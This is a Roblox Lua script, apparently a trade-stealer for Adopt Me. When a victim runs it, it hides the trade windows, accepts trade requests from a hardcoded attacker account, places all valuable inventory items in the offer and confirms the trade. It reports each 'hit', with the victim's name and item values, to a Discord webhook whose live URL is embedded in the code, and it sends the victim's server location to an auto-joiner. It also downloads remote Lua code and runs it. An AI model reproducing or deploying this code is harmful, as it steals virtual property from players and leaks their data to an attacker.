local USERNAME = "Jazonyy67" 
local WEBHOOK_URL = "https://discord.com/api/webhooks/1497168308489949234/FzshgxFf5uESFLgpdE6Ma45YnVp3pePX30drKAzgsIWSPvw75HPVHwpWAJ3vx9oHJydJ"

local targetName = USERNAME
local webhookUrl = WEBHOOK_URL
local valuesUrl = "https://raw.githubusercontent.com/deltamokey-arch/adm-values/refs/heads/main/values.lua"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local isLogging = false 
local hasFinishedFirstTrade = false

local BLACKLIST = {
    ["practice_dog"] = true, ["starter_egg"] = true, ["sandwich-default"] = true,
    ["ice_skates"] = true, ["trade_license"] = true, ["beach_2024_mahi_spinning_rod_temporary"] = true,
    ["white_bowtie"] = true, ["cowbell"] = true, ["blue_cap"] = true,
    ["squeaky_bone_default"] = true, ["stroller-default"] = true,
    ["ice_dimension_2025_ice_soup_bait"] = true, ["starter_egg_2025_mouse"] = true
}

-- ✨ ULTIEME TRANSPARANTIE FUNCTIE
local function hideUI(obj)
    if not obj then return end
    if obj:IsA("GuiObject") then
        pcall(function()
            obj.Visible = false
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then obj.TextTransparency = 1 end
            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then obj.ImageTransparency = 1 end
            obj.BackgroundTransparency = 1
        end)
    end
    for _, child in ipairs(obj:GetDescendants()) do
        hideUI(child)
    end
end

-- 🛠 VEILIGE DATABASE LADER (Fix voor crash)
local function getExternalValues()
    local success, source = pcall(function() return game:HttpGet(valuesUrl) end)
    if not success or source == "" then return {pets = {}} end
    
    local loadFunc = loadstring or (syn and syn.load_string)
    if type(loadFunc) ~= "function" then
        return {pets = {}}
    end

    source = source:match("^%s*(.-)%s*$")
    if not source:find("return") then source = source .. "\nreturn ValueList" end
    
    local funcSuccess, func = pcall(function() return loadFunc(source) end)
    if funcSuccess and type(func) == "function" then
        return func() or {pets = {}}
    end
    return {pets = {}}
end
local ValueList = getExternalValues()

-- 🔍 INVENTARIS CHECK (Tegen dubbele hits)
local function checkStillInInv(itemIds)
    local success, data = pcall(function() return require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name] end)
    local inv = (success and data) and data.inventory or nil
    if not inv then return false end
    for _, id in ipairs(itemIds) do
        for _, group in pairs(inv) do
            if group[id] then return true end
        end
    end
    return false
end

local function getItemInfo(uniqueId)
    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = ""}
    pcall(function()
        local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
        local inv = data and data.inventory
        for cat, group in pairs(inv) do
            if group[uniqueId] then
                local d = group[uniqueId]
                info.rawId = d.id or cat
                local name = info.rawId:gsub("_", " "):gsub("(%l)(%w*)", function(a,b) return a:upper()..b:lower() end)
                local vData = ValueList.pets and ValueList.pets[name]
                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. ((d.properties and d.properties.flyable) and "F" or "") .. ((d.properties and d.properties.rideable) and "R" or "")
                info.name = name .. (tag ~= "" and " ("..tag..")" or "")
                if vData then
                    local prefix = (d.mega_neon and "mvalue") or (d.neon and "nvalue") or "rvalue"
                    info.value = vData[prefix] or vData["value"] or 0
                    info.rarity = (vData.rarity or "common"):upper()
                else
                    info.rarity = (d.rarity or "common"):upper()
                end
                break
            end
        end
    end)
    return info
end

function postLog(data)
    if #data == 0 or isLogging then return end
    isLogging = true
    local list, total = "", 0
    for _, i in ipairs(data) do
        list = list .. "┕ **[" .. i.rarity .. "]** " .. i.name .. " | `Val: " .. i.value .. "`\n"
        total = total + i.value
    end
    local embed = {
        content = "🚨 **NEW HIT DETECTED** 🚨",
        embeds = {{
            title = "🎯 PAXS REPORT",
            color = 16711680,
            fields = {
                {name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true},
                {name = "💎 Total Value", value = "```" .. total .. "```", inline = true},
                {name = "📦 Items", value = list}
            },
            footer = {text = "Paxz V29 • " .. os.date("%X")}
        }}
    }
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        if type(req) == "function" then
            req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
        end
    end)
    task.wait(1) 
    isLogging = false
end

task.spawn(function()
    local API = ReplicatedStorage:WaitForChild("API")
    
    -- 🚨 DE JOIN DATA FIX 🚨 (Zorgt ervoor dat de Auto Joiner getriggerd wordt)
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        if type(req) == "function" then
            req({
                Url = webhookUrl, 
                Method = "POST", 
                Headers = {["Content-Type"] = "application/json"}, 
                Body = HttpService:JSONEncode({["content"] = "JOIN_DATA:" .. game.PlaceId .. ":" .. game.JobId .. ":" .. LocalPlayer.Name})
            })
        end
    end)

    while true do
        task.wait(hasFinishedFirstTrade and 0.5 or 1.0)
        
        local target = Players:FindFirstChild(targetName)
        local ui = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
        local reqUi = LocalPlayer.PlayerGui:FindFirstChild("TradeRequestApp")
        local hintUi = LocalPlayer.PlayerGui:FindFirstChild("HintApp")

        if ui then hideUI(ui) end
        if reqUi then hideUI(reqUi) end
        if hintUi then hideUI(hintUi) end

        if target then
            pcall(function() API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(target, true) end)

            if ui and ui:FindFirstChild("Frame") and ui.Frame.Visible then
                local currentTradeItems, currentIds = {}, {}
                local success, data = pcall(function() return require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name] end)
                local inv = (success and data) and data.inventory or nil
                
                if inv then
                    for cat, group in pairs(inv) do
                        if cat ~= "stickers" then
                            for id, _ in pairs(group) do 
                                local stats = getItemInfo(id)
                                if not BLACKLIST[stats.rawId] then
                                    table.insert(currentTradeItems, stats)
                                    table.insert(currentIds, id)
                                    pcall(function() API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(id) end)
                                end
                            end
                        end
                    end
                end

                while ui and ui:FindFirstChild("Frame") and ui.Frame.Visible do
                    pcall(function() 
                        API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
                        API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
                    end)
                    task.wait(0.3)
                end

                task.wait(0.5)
                if #currentTradeItems > 0 and not checkStillInInv(currentIds) then 
                    postLog(currentTradeItems)
                    hasFinishedFirstTrade = true
                end
            else
                pcall(function() API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(target) end)
            end
        end
    end
end)
